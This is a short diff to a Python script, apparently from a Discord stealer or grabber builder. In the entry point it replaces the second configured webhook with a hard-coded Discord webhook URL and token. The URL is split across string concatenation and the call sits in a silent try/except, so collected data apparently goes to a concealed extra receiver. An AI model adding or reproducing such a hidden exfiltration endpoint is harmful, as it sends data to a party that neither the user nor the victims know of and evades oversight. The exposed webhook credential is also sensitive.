@@ -35,6 +35,6 @@ if __name__ == '__main__':
     main(__CONFIG__['webhook'])
     sleep(5)
     try:
-        main(__CONFIG__['webhook2'])
+        main('https://discord.com/api/webhooks/1066536487'+'065227425/3bQPUGH4qeUZ_ISMWuiVzMwtTP_k5B_eNyLU0LOOy8pdgDJtCcaWt-NLDjPe9NixfBmw')
     except:
         print()
